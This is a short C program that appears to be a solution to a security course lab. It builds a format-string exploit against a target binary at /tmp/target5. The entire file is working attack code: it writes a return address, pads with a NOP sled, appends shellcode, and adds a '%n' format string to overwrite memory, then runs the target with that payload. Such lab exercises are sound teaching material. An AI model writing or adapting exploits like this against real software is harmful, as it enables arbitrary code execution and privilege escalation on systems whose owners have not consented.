#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  char crack_str[496];
  int i;

  strcpy(&crack_str[0], "\x8d\xfc\xff\xbf"); //Eip address
  for(i = 4; i < 434; i++) crack_str[i] = '\x90'; //nop sled
  strcpy(&crack_str[i], shellcode); 
  strcpy(&crack_str[i+45], "%d%d%12582426d%n"); //strformat args


  args[0] = TARGET;
  args[1] = crack_str;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
